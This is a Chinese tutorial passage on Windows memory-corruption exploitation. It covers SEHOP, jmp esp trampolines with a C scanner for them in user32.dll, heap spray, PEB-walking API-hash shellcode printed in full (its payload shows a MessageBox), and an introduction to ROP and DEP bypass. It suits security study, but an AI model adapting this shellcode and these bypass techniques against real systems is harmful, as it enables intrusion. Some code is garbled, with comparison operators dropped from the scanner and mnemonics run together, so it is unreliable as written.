Protection）</strong>是微软针对SEH攻击提出的一种安全防护方案。</p><p>SEH攻击是指通过栈溢出或者其他漏洞，使用精心构造的数据覆盖SEH上面的某个函数或者多个函数，从而控制EIP（控制程序执行流程）。</p><p><strong>SEHOP的核心是检测程序栈中的所有SEH结构链表的完整性</strong>，来判断应用程序是否受到了SEH攻击。</p><p>SEHOP针对下列条件进行检测，包括：</p><ul><li>SEH结构都必须在栈上，最后一个SEH结构也必须在栈上；</li><li>所有的SEH结构都必须是4字节对齐的；</li><li>SEH结构中异常处理函数的句柄handle（即处理函数地址）必须不在栈上；</li><li>最后一个SEH结构的handle必须是ntdll!FinalExceptionHandler函数F等。</li></ul><hr><blockquote><p>需要说明的是，虽然微软启用了GS、DEP、ASLR、SafeSEH、SEHOP等漏洞利用的防护技术，然而攻击者也在陆续发现着其他的漏洞利用手段，突破微软的防护技术。用魔高一尺道高一丈来描述两者间在漏洞利用技术上的对抗，一点也不为过。</p><p>接下来，介绍一些进一步的漏洞利用技术。</p></blockquote><h1 id="地址定位技术"><a href="#地址定位技术" class="headerlink" title="地址定位技术"></a>地址定位技术</h1><p>根据软件漏洞触发条件的不同，内存给调用函数分配内存的方式不同，shellcode的植入地址也不相同。下面根据shellcode代码不同的定位方式，介绍三种漏洞利用技术。</p><h2 id="静态shellcode地址的利用技术"><a href="#静态shellcode地址的利用技术" class="headerlink" title="静态shellcode地址的利用技术"></a>静态shellcode地址的利用技术</h2><p>如果存在溢出漏洞的程序，是一个操作系统每次启动都要加载的程序，操作系统启动时为其分配的内存地址一般是<strong>固定</strong>的，则函数调用时分配的<strong>栈帧地址也是固定的</strong>。</p><p>这种情况下，溢出后写入栈帧的shellcode代码其内存地址也是静态不变的，所以可以直接将shellcode代码在栈帧中的<strong>静态地址覆盖原有返回地址</strong>。在函数返回时，通过新的返回地址指向shellcode代码地址，从而执行shellcode代码。</p><p>在shellcode为静态地址时，缓冲区溢出前后内存中栈帧的变化示意图参见下图。</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/92702b2b1adc3367f0c289c2364a9597.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/92702b2b1adc3367f0c289c2364a9597.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="基于跳板指令的地址定位技术"><a href="#基于跳板指令的地址定位技术" class="headerlink" title="基于跳板指令的地址定位技术"></a>基于跳板指令的地址定位技术</h2><p>有些软件的漏洞存在于某些动态链接库中，它们在进程运行时被<strong>动态加载</strong>，因而在下一次被重新装载到内存中时，其<strong>在内存中的栈帧地址是动态变化的</strong>，则植入的shellcode代码在内存中的起始地址也是变化的。此外，如果在使用ASLR技术的操作系统中，地址会因为<strong>引入的随机数</strong>每次发生变化。</p><p>此时，需要让覆盖返回地址后新写入的返回地址能够自动定位到shellcode的起始地址。 </p><p>为了解决这个问题，可以利用<strong>esp寄存器</strong>的特性实现：</p><ul><li>在函数调用结束后，被调用函数的栈帧被释放，esp寄存器中的栈顶指针指向返回地址<strong>在内存高地址方向的相邻位置</strong>。</li><li>可见，通过esp寄存器，可以准确定位返回地址所在的位置。</li></ul><p>利用这种特性，可以实现对shellcode的动态定位，具体步骤如下：</p><ol><li>第一步，找到内存中任意一个汇编指令<code>jmp esp</code>，这条指令执行后可跳转到esp寄存器保存的地址，下面准备在溢出后<strong>将这条指令的地址覆盖返回地址</strong>。</li><li>第二步，设计好缓冲区溢出漏洞利用程序中的输入数据，使缓冲区溢出后，前面的填充内容为任意数据，紧接着<strong>覆盖返回地址的是jmp esp指令的地址</strong>，再接着覆盖<strong>与返回地址相邻的高地址位置</strong>并写入shellcode代码。</li><li>第三步，函数调用完成后函数返回，<strong>根据返回地址中指向的jmp esp指令的地址去执行jmp esp操作</strong>，即跳转到esp寄存器中保存的地址，而函数返回后esp中保存的地址是与返回地址相邻的高地址位置，在这个位置保存的是shellcode代码，则<strong>shellcode代码被执行</strong>。</li></ol><blockquote><p>上述方法使用jmp esp指令做为跳板，实现了在栈帧动态分配的情况下，可以自动跳回shellcode的地址并执行。</p></blockquote><p>对于查找jmp esp的指令地址，可以在系统常用的user32.dll等动态链接库，或者其他被所有程序都加载的模块中查找，这些动态链接库或者模块加载的基地址始终是固定的。<br>虽然采用了ASLR技术，高版本windows系统有很多并没有受到ASLR保护的动态链接库或者系统函数，可以用来查找固定不变的jmp esp等指令。</p><p><font color=red>以jmp esp做为跳板定位shellcode的内存地址示意图见下图</font></p><p><img src="/2023/03/14/lou-dong-li-yong-pian/71727f6553fe50768b6983257f9c5c57.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/71727f6553fe50768b6983257f9c5c57.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>除了jmp esp之外，mov eax,esp和jmp eax等指令序列也可以实现进入栈区的功能。</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot; //此处定义需要查找的 dll 名字</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  BYTE *ptr;</span><br><span class="line">  int position, address;</span><br><span class="line">  HINSTANCE handle;</span><br><span class="line">  BOOL done_flag = FALSE;</span><br><span class="line">  handle = LoadLibraryA(DLL_NAME); // LoadLibraryA 是调用 dll 的函数名</span><br><span class="line">  if (!handle)                     //若没找到则进入该 if</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot; load dll error!&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = (BYTE *)handle;</span><br><span class="line">  printf(&quot;start at 0x%x\n&quot;, handle);</span><br><span class="line">  for (position = 0; !done_flag; position++)</span><br><span class="line">  &#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">      if (ptr[position]  0xFF &amp;&amp; ptr[position + 1]  0xE4) // jmp esp 的机器码为</span><br><span class="line">        E4FF</span><br><span class="line">        &#123;</span><br><span class="line">          address = (int)ptr + position;</span><br><span class="line">          printf(&quot;jmp esp found at 0x%x\n&quot;, address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (2)</span><br><span class="line">    &#123;</span><br><span class="line">      address = (int)ptr + position;</span><br><span class="line">      printf(&quot;END of 0x%x\n&quot;, address);</span><br><span class="line">      done_flag = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">//通过上述程序运行就可以得到很多jmp esp的指令地址</span><br></pre></td></tr></table></figure><p><img src="/2023/03/14/lou-dong-li-yong-pian/0936007bdb35a148adfdb6dabe45e09d.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/0936007bdb35a148adfdb6dabe45e09d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>第二步，构造溢出字符串，选择一个 jmp esp 的指令，让其覆盖返回地址，在之后写入<br>原先编制后的调用 messagebox 的 shellcode。</p><h2 id="内存喷洒技术"><a href="#内存喷洒技术" class="headerlink" title="内存喷洒技术"></a>内存喷洒技术</h2><p>有些特殊的软件漏洞，不支持或者不能实现<strong>精确定位</strong>shellcode。同时，<strong>存在漏洞的软件其加载地址动态变化，采用shellcode的静态地址覆盖方法难以实施</strong>。由于堆分配地址随机性较大，为了解决shellcode在堆中的定位以便触发，可以采用<code>heap spray</code>的方法。</p><p><strong>内存喷射技术的代表是堆喷洒Heap spray，也称为堆喷洒技术</strong>，是在shellcode的前面加上大量的<strong>滑板指令（slide code）</strong>，组成一个非常长的注入代码段。然后向系统申请大量内存，并且<strong>反复用这个注入代码段来填充</strong>。这样就使得内存空间被大量的注入代码所占据。攻击者再结合漏洞利用技术，<strong>只要使程序跳转到堆中被填充了注入代码的任何一个地址，程序指令就会顺着滑板指令最终执行到shellcode代码</strong>。</p><h3 id="滑板指令"><a href="#滑板指令" class="headerlink" title="滑板指令"></a>滑板指令</h3><p>滑板指令（slide code）是由大量<strong>NOP(no-operation)空指令0x90</strong>填充组成的指令序列，当遇到这些NOP指令时，CPU指令指针会一个指令接一个指令的执行下去，中间不做任何具体操作，直到“滑”过最后一个滑板指令后，接着执行这些指令后面的其他指令，往往后面接着的是shellcode代码。 </p><p>随着一些新的攻击技术的出现，<strong>滑板指令除了利用NOP指令填充外，也逐渐开始使用更多的类NOP指令，譬如0x0C，0x0D（回车、换行）等</strong>。</p><p>Heap Spray技术通过使用类NOP指令来进行覆盖，对shellcode地址的跳转准确性要求不高了，从而增加了缓冲区溢出攻击的成功率。然而，Heap Spray会导致被攻击进程的内存占用非常大，计算机无法正常运转，因而容易被察觉。</p><blockquote><p>它一般配合堆栈溢出攻击，不能用于主动攻击，也不能保证成功。</p></blockquote><p>针对Heap Spray，对于windows系统比较好的系统防范办法是<strong>开启DEP功能</strong>，即使被绕过，被利用的概率也会大大降低。</p><h1 id="API函数自搜索技术"><a href="#API函数自搜索技术" class="headerlink" title="API函数自搜索技术"></a>API函数自搜索技术</h1><p>前面的Shellcode都采用<strong>硬编址</strong>的方式来调用相应API函数。首先，获取所要使用函数的地址，然后将该地址写入ShellCode，从而实现调用。如果系统版本变了，很多函数的地址往往会发生变化，那么调用肯定就会失败了。<br><strong>编写通用shellcode，shellcode自身就必须具备动态的自动搜索所需API函数地址的能力，即API函数自搜索技术。</strong><br>以MessageBoxA函数的调用的shellcode为例，来解释通用型shellcode的编写逻辑。MessageBoxA位于<code>user32.dll</code>中，用于弹出消息框。LoadLibraryA位于<code>kernel32.dll</code>中，用于加载<code>user32.dll</code>。</p><h2 id="通用性Shellcode的编写逻辑"><a href="#通用性Shellcode的编写逻辑" class="headerlink" title="通用性Shellcode的编写逻辑"></a>通用性Shellcode的编写逻辑</h2><p>调用MessageBoxA函数，应该先使用LoadLibrary(“user32.dll”)装载user32.dll。</p><p>定位LoadLibrary函数的步骤如下：</p><ol><li>定位kernel32.dll。</li><li>解析kernel32.dll的导出表</li><li>搜索定位LoadLibrary等目标函数。</li><li>基于找到的函数地址，完成Shellcode的编写。</li></ol><p>难点在于第一步到第三步，即如何实现API函数自搜索。<br>所有的Win32程序都会自动加载<code>ntdll.dll</code>以及<code>kernel32.dll</code>这两个最基础的动态链接库，接下来，我们看看怎么完成对<code>kernel32.dll</code>里的API的搜索。</p><h3 id="定位kernel32-dll"><a href="#定位kernel32-dll" class="headerlink" title="定位kernel32.dll"></a>定位kernel32.dll</h3><ol><li>首先通过段选择字FS在内存中<strong>找到当前的线程环境块TEB</strong>。</li><li>线程环境块偏移地址为<strong>0x30的地址</strong>存放着指向进程环境块PEB的指针。</li><li>进程环境块中偏移地址为0x0c的地方存放着指向PEB_LDR_DATA结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</li><li>PEB_LDR_DATA结构体偏移位置为<strong>0x1C的地址</strong>存放着指向模块初始化链表的头指针 InInitializationOrderModuleList。</li><li>模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32。</li><li>找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     _asm</span><br><span class="line">     &#123;</span><br><span class="line">             mov eax, fs:[0x30] ;PEB的地址 </span><br><span class="line">             mov eax, [eax + 0x0c] ; PEB_LDR_DATA结构体的地址 </span><br><span class="line">             mov esi, [eax + 0x1c] ; InInitializationOrderModuleList地址 </span><br><span class="line">             lodsd      ;取得是双字节,即mov eax,[esi],esi=esi+4;</span><br><span class="line">             mov eax, [eax + 0x08] ;eax就是kernel32.dll的地址 </span><br><span class="line">     &#125;</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定位kernel32-dll-1"><a href="#定位kernel32-dll-1" class="headerlink" title="定位kernel32.dll"></a>定位kernel32.dll</h3><p>找到了kernel32.dll，由于它也是属于PE文件，那么我们可以根据PE文件的结构特征，定位其导出表，进而定位导出函数列表信息，然后进行解析、遍历搜索，找到我们所需要的API函数。<br>**定位导出表及函数列表的步骤如下： **</p><ol start="7"><li>从kernel32.dll加载基址算起，偏移0x3c的地方就是其PE头的指针。</li><li>PE头偏移0x78的地方存放着指向函数导出表的指针。</li><li>获得导出函数偏移地址（RVA）列表、导出函数名列表：  • 导出表偏移0x1c处的指针指向存储导出函数偏移地址（RVA）的列表。<br> • 导出表偏移0x20处的指针指向存储导出函数函数名的列表。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov    ebp, eax                                            //将kernel32.dll基地址赋值给ebp</span><br><span class="line">moveax,[ebp+0x3C] //dll的PE头的指针（相对地址） </span><br><span class="line">movecx,[ebp+eax+0x78]//导出表的指针（相对地址）</span><br><span class="line">addecx,ebp              // 得到导出表的内存地址</span><br><span class="line">movebx,[ecx+0x20]//导出函数名列表指针</span><br><span class="line">addebx,ebp                          //导出函数名列表指针的基地址</span><br></pre></td></tr></table></figure><h3 id="搜索定位目标函数"><a href="#搜索定位目标函数" class="headerlink" title="搜索定位目标函数"></a>搜索定位目标函数</h3><p>可以通过<strong>遍历两个函数相关列表</strong>，<strong>算出所需函数的入口地址</strong>：</p><ul><li>函数的RVA地址和名字按照顺序存放在上述两个列表中，可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA。</li><li>获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是最终在ShellCode中调用时需要的地址。</li></ul><p>按照这个方法，就可以获得kernel32.dll中的任意函数。</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/d9e0ffe34328af53fc6f78cef5c775d5.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/d9e0ffe34328af53fc6f78cef5c775d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="完整的通用性Shellcode"><a href="#完整的通用性Shellcode" class="headerlink" title="完整的通用性Shellcode"></a>完整的通用性Shellcode</h2><p>为了让 shellcode 更加通用，能被大多数缓冲区容纳，总是希望 shellcode 尽可能短。<br>因此，一般情况下并不会“MessageBoxA”等这么长的字符串去进行直接比较。所以会对所需的 API 函数名进行 <strong>hash 运算</strong>，这样只要比较 hash 所得的摘要就能判定是不是我们所需的 API了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">DWORD GetHash(char *fun_name)</span><br><span class="line">&#123;</span><br><span class="line"> DWORD digest=0;</span><br><span class="line"> while(*fun_name)</span><br><span class="line"> &#123;</span><br><span class="line"> digest=((digest&lt;&lt;25)|(digest&gt;&gt;7)); //循环右移 7 位</span><br><span class="line"> /* movsx eax,byte ptr[esi] </span><br><span class="line"> cmp al,ah </span><br><span class="line"> jz compare_hash</span><br><span class="line"> ror edx, 7 ; ((循环))右移,不是单纯的 &gt;&gt;7</span><br><span class="line"> add edx,eax</span><br><span class="line"> inc esi</span><br><span class="line"> jmp hash_loop </span><br><span class="line"> */</span><br><span class="line"> digest+= *fun_name ; //累加</span><br><span class="line"> fun_name++;</span><br><span class="line"> &#125;</span><br><span class="line"> return digest;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"> DWORD hash;</span><br><span class="line"> hash= GetHash(&quot;MessageBoxA&quot;);</span><br><span class="line"> printf(&quot;%#x\n&quot;,hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过上述代码，我们可以获得 MessageboxA 的 hash 值。接下来，我们可以在 shellcode 中通过压栈的方式将这个 hash 值压入栈中，再通过比较得到动态链接库中的 API 地址。</p></blockquote><p><strong>完整 API 函数自搜索代码</strong>：首先，基于上述流程找到函数的入口地址；之后，可以编写<br>自己的 shellcode，如下面完整代码中的 function_call。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> __asm</span><br><span class="line"> &#123;</span><br><span class="line"> CLD //清空标志位 DF</span><br><span class="line"> push 0x1E380A6A //压入 MessageBoxA 的 hash--&gt;user32.dll</span><br><span class="line"> push 0x4FD18963 //压入 ExitProcess 的 hash--&gt;kernel32.dll</span><br><span class="line"> push 0x0C917432 //压入 LoadLibraryA 的 hash--&gt;kernel32.dll</span><br><span class="line"> mov esi,esp //esi=esp,指向堆栈中存放 LoadLibraryA 的 hash 的地址</span><br><span class="line"> lea edi,[esi-0xc] //空出 8 字节应该是为了兼容性</span><br><span class="line"> //开辟一些栈空间</span><br><span class="line"> xor ebx,ebx</span><br><span class="line"> mov bh,0x04</span><br><span class="line"> sub esp,ebx //esp-=0x400</span><br><span class="line"> //压入&quot;user32.dll&quot;</span><br><span class="line"> mov bx,0x3233 </span><br><span class="line"> push ebx //0x3233 </span><br><span class="line"> push 0x72657375 //&quot;user&quot;</span><br><span class="line"> push esp </span><br><span class="line"> xor edx,edx //edx=0</span><br><span class="line"> //找 kernel32.dll 的基地址</span><br><span class="line"> mov ebx,fs:[edx+0x30] //[TEB+0x30]--&gt;PEB</span><br><span class="line"> mov ecx,[ebx+0xC] //[PEB+0xC]---&gt;PEB_LDR_DATA</span><br><span class="line"> mov ecx,[ecx+0x1C]</span><br><span class="line">//[PEB_LDR_DATA+0x1C]---&gt;InInitializationOrderModuleList</span><br><span class="line"> mov ecx,[ecx] //进入链表第一个就是 ntdll.dll</span><br><span class="line"> mov ebp,[ecx+0x8] //ebp= kernel32.dll 的基地址</span><br><span class="line"> </span><br><span class="line"> //是否找到了自己所需全部的函数</span><br><span class="line">find_lib_functions:</span><br><span class="line"> lodsd //即 move eax,[esi], esi+=4, 第一次取 LoadLibraryA 的 hash</span><br><span class="line"> cmp eax,0x1E380A6A //与 MessageBoxA 的 hash 比较</span><br><span class="line"> jne find_functions //如果没有找到 MessageBoxA 函数，继续找</span><br><span class="line"> xchg eax,ebp //------------------------------------&gt; |</span><br><span class="line"> call [edi-0x8] //LoadLibraryA(&quot;user32&quot;) |</span><br><span class="line"> xchg eax,ebp //ebp=userl32.dll 的基地址,eax=MessageBoxA 的 hash </span><br><span class="line">&lt;-- |</span><br><span class="line"> </span><br><span class="line"> //导出函数名列表指针</span><br><span class="line">find_functions:</span><br><span class="line"> pushad //保护寄存器</span><br><span class="line"> mov eax,[ebp+0x3C] //dll 的 PE 头</span><br><span class="line"> mov ecx,[ebp+eax+0x78] //导出表的指针</span><br><span class="line"> add ecx,ebp //ecx=导出表的基地址</span><br><span class="line"> mov ebx,[ecx+0x20] //导出函数名列表指针</span><br><span class="line"> add ebx,ebp //ebx=导出函数名列表指针的基地址</span><br><span class="line"> xor edi,edi </span><br><span class="line"> </span><br><span class="line"> //找下一个函数名 </span><br><span class="line">next_function_loop:</span><br><span class="line"> inc edi</span><br><span class="line"> mov esi,[ebx+edi*4] //从列表数组中读取</span><br><span class="line"> add esi,ebp //esi = 函数名称所在地址</span><br><span class="line"> cdq //edx = 0</span><br><span class="line"> </span><br><span class="line"> //函数名的 hash 运算</span><br><span class="line">hash_loop: </span><br><span class="line"> movsx eax,byte ptr[esi] </span><br><span class="line"> cmp al,ah //字符串结尾就跳出当前函数 </span><br><span class="line"> jz compare_hash</span><br><span class="line"> ror edx,7</span><br><span class="line"> add edx,eax</span><br><span class="line"> inc esi</span><br><span class="line"> jmp hash_loop</span><br><span class="line"> //比较找到的当前函数的 hash 是否是自己想找的</span><br><span class="line">compare_hash:</span><br><span class="line"> cmp edx,[esp+0x1C] //lods pushad 后,栈+1c 为 LoadLibraryA 的 hash</span><br><span class="line"> jnz next_function_loop</span><br><span class="line"> mov ebx,[ecx+0x24] //ebx = 顺序表的相对偏移量</span><br><span class="line"> add ebx,ebp //顺序表的基地址</span><br><span class="line"> mov di,[ebx+2*edi] //匹配函数的序号</span><br><span class="line"> mov ebx,[ecx+0x1C] //地址表的相对偏移量</span><br><span class="line"> add ebx,ebp //地址表的基地址</span><br><span class="line"> add ebp,[ebx+4*edi] //函数的基地址 </span><br><span class="line"> xchg eax,ebp //eax&lt;&gt;ebp 交换</span><br><span class="line"> </span><br><span class="line"> pop edi</span><br><span class="line"> stosd //把找到的函数保存到 edi 的位置</span><br><span class="line"> push edi</span><br><span class="line"> </span><br><span class="line"> popad </span><br><span class="line"> cmp eax,0x1e380a6a //找到最后一个函数 MessageBox 后，跳出循环</span><br><span class="line"> jne find_lib_functions</span><br><span class="line"> //让他做些自己想做的事</span><br><span class="line">function_call:</span><br><span class="line"> xor ebx,ebx</span><br><span class="line"> push ebx </span><br><span class="line"> push 0x74736577 </span><br><span class="line"> push 0x74736577 //push &quot;westwest&quot;</span><br><span class="line"> mov eax,esp </span><br><span class="line"> push ebx</span><br><span class="line"> push eax</span><br><span class="line"> push eax</span><br><span class="line"> push ebx</span><br><span class="line"> call [edi-0x04] //MessageBoxA(NULL,&quot;westwest&quot;,&quot;westwest&quot;,NULL)</span><br><span class="line"> push ebx </span><br><span class="line"> call [edi-0x08] //ExitProcess(0);</span><br><span class="line"> nop </span><br><span class="line"> nop</span><br><span class="line"> nop</span><br><span class="line"> nop</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h1><p><strong>DEP技术</strong>可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行，已经成为Windows的重要保护措施，但是它依然可以被绕过。</p><p>支持硬件DEP的CPU会拒绝执行被标记为不可执行的(NX)内存页的代码。</p><p>当我们尝试在启用DEP的内存执行代码，程序将会返回访问冲突STATUS_ACCESS_VIOLATION (0xc0000005) 并终止程序，对于攻击者来说这显然不是好事。</p><p>然而，考虑应用可用性，程序有时候需要在不可执行区域执行代码，这意味着<u>调用某个Windows API可以把某段不可执行区域设置为可执行</u>。</p><p><font color=red>在DEP保护下，怎么去编写shellcode来完成函数调用呢？</font></p><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p><strong>ROP</strong></p><p>ROP的全称为<code>Return-oriented programming（返回导向编程）</code>；<br>是一种新型的<strong>基于代码复用技术</strong>的攻击，<strong>它从已有的库或可执行文件中提取指令片段，构建恶意代码。</strong></p><p><strong>ROP的基本思想</strong></p><p>借助已存在的<strong>代码块(也叫配件，Gadget)<strong>，这些</strong>配件来自程序已经加载的模块</strong>；在已加载的模块中找到一些<strong>以retn结尾的配件</strong>，把这些配件的地址布置在堆栈上, 当控制EIP并返回时候, 程序就会跳去执行这些小配件；这些<strong>小配件是在别的模块代码段</strong>, 不受DEP的影响。</p><p>对于ROP技术可以总结为以下三点：</p><ol><li>ROP通过ROP链（retn）实现有序汇编指令的执行。</li><li>ROP链由一个个ROP小配件（Gadget，相当于一个小节点）组成。</li><li>ROP小配件由“目的执行指令+retn指令组成”。</li></ol><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="/2023/03/14/lou-dong-li-yong-pian/bfaa876110788b402c3230bbb021073d.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/bfaa876110788b402c3230bbb021073d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/14/lou-dong-li-yong-pian/3f6a87a8c73cdbc64f2aa4e114ef399b.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/3f6a87a8c73cdbc64f2aa4e114ef399b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="基于ROP的漏洞利用"><a href="#基于ROP的漏洞利用" class="headerlink" title="基于ROP的漏洞利用"></a>基于ROP的漏洞利用</h2><p>ROP可以通过一些小配件构建期待的目标指令序列，但是因为它严重依赖内存中已存在的代码序列，因此，构建复杂和大规模的代码序列是非常难的。<br>在实际应用中，<strong>基于ROP编写的代码序列可以利用有限的编码完成下述目标来达到攻击的目的</strong>：</p><ol><li><strong>调用相关API关闭或绕过DEP保护</strong>。相关的API包括SetProcessDEPPlolicy、VirtualAlloc、NtSetInformationProcess、VirtualProtect等，比如VirtualProtect函数可以将内存块的属性修改为Executable。</li><li><strong>实现地址跳转</strong>，直接转向不受DEP保护的区域里保存的shellcode执行。</li><li><strong>调用相关API将shellcode写入不受DEP保护的可执行内存</strong>。进而，配合基于ROP编写的地址跳转指令，完成漏洞利用。</li></ol><h1 id="绕过其他安全防护"><a href="#绕过其他安全防护" class="headerlink" title="绕过其他安全防护"></a>绕过其他安全防护</h1><p> 漏洞又称为脆弱性，本书的一个观点就是只要有不健壮的地方，就存在被利用的可能。正所谓道高一尺、魔高一丈，接下来，我们简要介绍对于GS安全机制、ASLR机制、SEH保护机制等安全防护策略的绕过策略。</p><h2 id="绕过GS安全机制"><a 